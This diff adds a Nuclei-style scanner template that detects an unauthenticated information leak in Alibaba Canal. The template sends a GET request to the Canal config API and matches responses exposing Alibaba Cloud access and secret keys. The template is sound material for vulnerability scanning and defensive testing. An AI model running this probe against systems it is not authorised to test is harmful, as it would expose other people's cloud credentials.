@@ -1,0 +1,26 @@
+id: poc-yaml-alibaba-canal-info-leak
+
+info:
+  name: poc-yaml-alibaba-canal-info-leak
+  author: Aquilao(https://github.com/Aquilao)
+  severity: high
+  tags: xray-converted,exposure,ct-158902
+  reference:
+    - https://github.com/alibaba/canal/issues/3451
+
+http:
+  - raw:
+      - |
+        GET /api/v1/canal/config/1/1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "ncanal.aliyun.accessKey"
+          - "ncanal.aliyun.secretKey"
